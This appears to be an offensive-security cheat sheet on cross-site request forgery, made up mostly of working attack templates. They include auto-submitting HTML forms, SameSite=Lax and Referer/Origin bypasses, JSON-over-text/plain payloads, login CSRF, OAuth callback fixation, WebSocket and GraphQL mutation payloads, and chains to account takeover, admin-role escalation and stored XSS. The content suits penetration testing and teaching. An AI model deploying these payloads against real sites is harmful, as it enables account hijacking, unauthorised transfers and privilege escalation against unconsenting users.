---
tags:
  - medium
  - client-side
---

# Cross-Site Request Forgery (CSRF)

Force an authenticated user to execute unwanted actions on a web application where they're currently authenticated. In 2024+, SameSite=Lax is default, but numerous bypasses exist.

## TL;DR

```html
<!-- SameSite=Lax bypass via top-level GET -->
<script>window.location = 'https://target.com/transfer?to=attacker&amount=1000';</script>

<!-- JSON via text/plain (no preflight) -->
<form action="https://target.com/api/update" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","padding":"' value='"}'>
</form>
```

## How It Works

CSRF exploits the trust a website has in a user's browser. When a user is authenticated to a site:

1. **Session established** - User logs in, receives session cookie
2. **Browser stores credential** - Cookie auto-sent with all requests to that domain
3. **Attacker crafts malicious request** - Hidden form or link targeting privileged action
4. **User triggers request** - Clicking link or visiting attacker page auto-submits
5. **Server trusts request** - Cookies attached, server sees authenticated request

**Traditional Protections:**
- Anti-CSRF tokens (synchronized token pattern)
- SameSite cookie attribute (Lax/Strict)
- Referer/Origin header validation
- Custom headers (requires preflight)

**Why they fail:**
- Tokens leaked in URLs/responses
- SameSite=Lax allows top-level GET navigations
- Referer can be suppressed
- Simple content-types bypass preflight

## Detection

### Where to Look

**High-Impact Endpoints:**
```
/settings/email          # Account takeover vector
/settings/password       # Direct account takeover
/oauth/connect           # Link attacker's OAuth account
/oauth/disconnect        # Remove security features
/api/transfer            # Financial transactions
/admin/*                 # Privilege escalation
/settings/2fa/disable    # Security downgrade
```

### Signals

**Missing Token:**
```http
POST /api/delete HTTP/1.1
Host: target.com
Content-Type: application/json

{"id": 123}
```
No CSRF token in headers, body, or custom header.

**Token in GET Parameter:**
```http
GET /delete?id=123&csrf=abc123 HTTP/1.1
```
Token in URL = leaked via Referer header.

**State-Changing GET Requests:**
```http
GET /api/transfer?to=attacker&amount=1000 HTTP/1.1
```
SameSite=Lax won't protect GET requests.

**No Referer/Origin Check:**
```bash
# Test by removing headers
curl -X POST https://target.com/api/delete \
  -H "Cookie: session=..." \
  -H "Referer:" \
  -d "id=123"
```

## Exploitation

### SameSite=Lax Bypass - Top-Level GET

```html
<!-- Redirect to state-changing GET endpoint -->
<!DOCTYPE html>
<html>
<head>
  <title>Redirecting...</title>
</head>
<body>
  <script>
    window.location = 'https://target.com/api/delete?id=123';
  </script>
</body>
</html>
```

### Method Override Trick

```html
<!-- Some frameworks accept _method parameter -->
<form action="https://target.com/api/delete" method="GET">
  <input type="hidden" name="_method" value="DELETE">
  <input type="hidden" name="id" value="123">
</form>
<script>document.forms[0].submit();</script>
```

### JSON via text/plain

```html
<!-- Browser sends without CORS preflight -->
<form action="https://target.com/api/update" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","padding":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>

<!-- Server receives: {"email":"attacker@evil.com","padding":"="} -->
```

### Login CSRF

```html
<!-- Force victim to login as attacker's account -->
<form action="https://target.com/login" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="password" value="AttackerPassword123">
</form>
<script>
  document.forms[0].submit();
</script>

<!-- Victim now logged into attacker's account -->
<!-- Victim enters sensitive data → attacker sees it -->
```

### OAuth State Fixation

```html
<!-- CSRF on OAuth callback without state validation -->
<img src="https://target.com/oauth/callback?code=ATTACKER_OAUTH_CODE">

<!-- Links victim's account to attacker's OAuth account -->
<!-- Attacker can now login as victim via OAuth -->
```

### WebSocket Handshake Bypass

```javascript
// Many WebSocket implementations don't verify Origin
const ws = new WebSocket('wss://target.com/socket');

ws.onopen = () => {
  ws.send(JSON.stringify({
    action: 'deleteAccount',
    userId: 'victim-id'
  }));
};

ws.onmessage = (event) => {
  console.log('Response:', event.data);
};
```

### GraphQL GET Mutation

```html
<!-- If GraphQL accepts mutations via GET -->
<img src="https://target.com/graphql?query=mutation{updateEmail(email:\"attacker@evil.com\")}">

<!-- Or via auto-submit form -->
<form action="https://target.com/graphql" method="POST">
  <input type="hidden" name="query" value="mutation{deleteAccount}">
</form>
<script>document.forms[0].submit();</script>
```

### Auto-Submit Template

```html
<!DOCTYPE html>
<html>
<head>
  <title>Please wait...</title>
</head>
<body onload="document.getElementById('csrf').submit()">
  <form id="csrf" action="https://target.com/api/transfer" method="POST">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="1000">
  </form>
  <p>Loading...</p>
</body>
</html>
```

## Bypasses

### Token Leakage

**Check these locations:**
```javascript
// URL parameters (leaked via Referer)
https://target.com/delete?id=123&csrf_token=abc123

// JavaScript files
const csrfToken = "abc123-def456-ghi789";

// JSON responses
fetch('/api/user').then(r => r.json())
// Response: {"user": "...", "csrf": "token"}

// localStorage accessible cross-origin
localStorage.getItem('csrfToken')

// Exposed API endpoints
/api/csrf-token
```

### Token Not Validated

```bash
# Test: Remove token completely
curl -X POST https://target.com/api/delete -d "id=123"

# Test: Empty token
curl -X POST https://target.com/api/delete -d "id=123&csrf="

# Test: Wrong token
curl -X POST https://target.com/api/delete -d "id=123&csrf=WRONG"

# Test: Reuse old/expired token
curl -X POST https://target.com/api/delete -d "id=123&csrf=OLD_TOKEN"
```

### Token Fixation

```
1. Attacker generates valid CSRF token on their session
2. Forces victim's session to use same token (session fixation)
3. Uses same token in CSRF attack
4. Server validates token → attack succeeds
```

### Referer Suppression

```html
<!-- Remove Referer header -->
<meta name="referrer" content="no-referrer">

<form action="https://target.com/api/delete" method="POST">
  <input type="hidden" name="id" value="123">
</form>

<!-- Via data: URI -->
<iframe src="data:text/html,
  <form action='https://target.com/api/delete' method='POST'>
    <input name='id' value='123'>
  </form>
  <script>document.forms[0].submit()</script>
"></iframe>
```

### Origin Validation Bypass

```http
# Test null origin
Origin: null

# Test subdomain
Origin: https://sub.target.com

# Test lookalike domain
Origin: https://target.com.evil.com

# Test with credentials
Origin: https://attacker@target.com
```

## Escalation

### CSRF to Account Takeover

**Chain 1: Email Change → Password Reset**
```
1. CSRF to change victim's email to attacker@evil.com
2. Initiate password reset
3. Receive reset link at attacker@evil.com
4. Full account takeover
```

**Chain 2: OAuth Link → Login**
```
1. CSRF to link victim's account with attacker's OAuth
2. Attacker logs in via OAuth (as victim)
3. Full account access
```

**Chain 3: Login CSRF → Data Exfiltration**
```
1. Force victim to login as attacker's account
2. Victim enters sensitive data (payment info, etc.)
3. Attacker logs into their own account → sees victim's data
```

### CSRF to XSS

```html
<!-- CSRF to inject XSS payload -->
<form action="https://target.com/settings/update" method="POST">
  <input type="hidden" name="bio" value="<script>alert(document.domain)</script>">
</form>
```

### CSRF to Privilege Escalation

```html
<!-- CSRF to add admin role -->
<form action="https://target.com/admin/users/123/roles" method="POST">
  <input type="hidden" name="role" value="admin">
</form>
```

## Pro Tips

- **SameSite=Lax ≠ Full Protection** - GET state-changes are still vulnerable to top-level navigation
- **OAuth Flows = High-Value Targets** - connect/disconnect endpoints often lack CSRF protection
- **GraphQL GET Mutations** - Rare but devastating when found
- **Login CSRF Underrated** - Allows data capture when victim uses attacker's account
- **text/plain Content-Type** - Bypasses CORS preflight for JSON endpoints
- **WebSocket Origin Checks** - Often missing or improperly validated
- **Test Every State-Changing Action** - Don't just focus on obvious targets
- **Multi-Step CSRF** - Chain multiple CSRF attacks for greater impact
- **Time-Sensitive Actions** - Password resets, 2FA setup often have weaker protection
- **Mobile App APIs** - Often lack CSRF protection (assume same-origin)

## References

- [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger Web Security Academy - CSRF](https://portswigger.net/web-security/csrf)
- [SameSite Cookie Attribute Explained](https://web.dev/samesite-cookies-explained/)
- [OAuth 2.0 Security Best Practices](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)
